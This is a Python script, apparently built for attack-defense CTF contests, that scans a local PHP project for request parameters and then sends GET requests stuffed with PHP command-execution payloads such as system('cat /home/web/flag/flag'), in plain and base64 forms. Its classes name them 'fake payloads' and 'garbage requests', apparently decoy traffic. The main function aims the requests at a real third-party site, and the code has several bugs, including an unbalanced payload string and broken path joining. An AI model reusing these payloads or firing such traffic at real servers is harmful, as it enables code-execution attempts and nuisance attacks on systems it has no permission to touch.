import re
import sys
import base64
import os
import requests


class SearchARGS:
    def __init__(self, path=None, tag=None):
        self.path = path
        self.tag = tag

    @staticmethod
    def search_args(filename, tag, show_tag=False):
        with open(filename, 'r') as fcontent:
            content = fcontent.read()
        fcontent.close()
        if fcontent is None:
            return None
        re_rule = re.compile(r'(\${}\[(\'|\")?(.*?)(\'|")?\])'.format(tag), re.I)
        r_reuslts = re.findall(re_rule, content)
        if len(r_reuslts) < 1:
            return None
        if show_tag:
            for item in r_reuslts:
                print(item[0])
        return r_reuslts

    @property
    def get_args(self):
        php_args = []
        for root, dirs, files in os.walk(self.path):
            for name in files:
                if name.endswith(".php"):
                    full_path = root + '/' + name
                    php_arg = self.search_args(full_path, self.tag)
                    if php_arg is not None:
                        php_args.append((root + name, php_arg))
        return php_args


class FakePayloads:
    def __init__(self, flagpath='/home/web/flag/flag'):
        self.flag_path = flagpath

    @property
    def plain_payloads(self):
        plain_payloads = []
        plain_payloads.append('system("cat {}");'.format(self.flag_path))
        plain_payloads.append('highlight_file(\"{}\");'.format(self.flag_path))
        plain_payloads.append('echo file_get_contents(\"{}\");'.format(self.flag_path))
        plain_payloads.append('var_dump(file_get_contents(\"{}\"));'.format(self.flag_path))
        plain_payloads.append('print_r(file_get_contents(\"{}\");'.format(self.flag_path))
        return plain_payloads

    @property
    def base64_payloads(self):
        return [base64.b64encode(payload.replace('\n', '').encode('utf-8')) for payload in self.plain_payloads]


def handle_get(url, root, flag_path):
    all_requests = []
    http_get = SearchARGS(root, '_POST').get_args
    payload = FakePayloads(flag_path)
    plain_payloads = payload.plain_payloads
    base64_payloads = payload.base64_payloads
    for item in http_get:
        path = item[0]
        args = item[1]
        for arg in args:
            for payload in plain_payloads:
                new_url = "{}{}?{}={}".format(url, root, arg[2], payload)
                garbage_requests = requests.get(new_url)
                all_requests.append(garbage_requests)
            for payload in base64_payloads:
                new_url = "{}{}?{}={}".format(url, root, arg[2], payload)
                garbage_requests = requests.get(new_url)
                all_requests.append(garbage_requests)
    return all_requests


def main():
    root = '/home/hio/PhpstormProjects/untitled'
    handle_get("https://www.baidu.com", root, "/home/web/flag/flag")


if __name__ == "__main__":
    main()
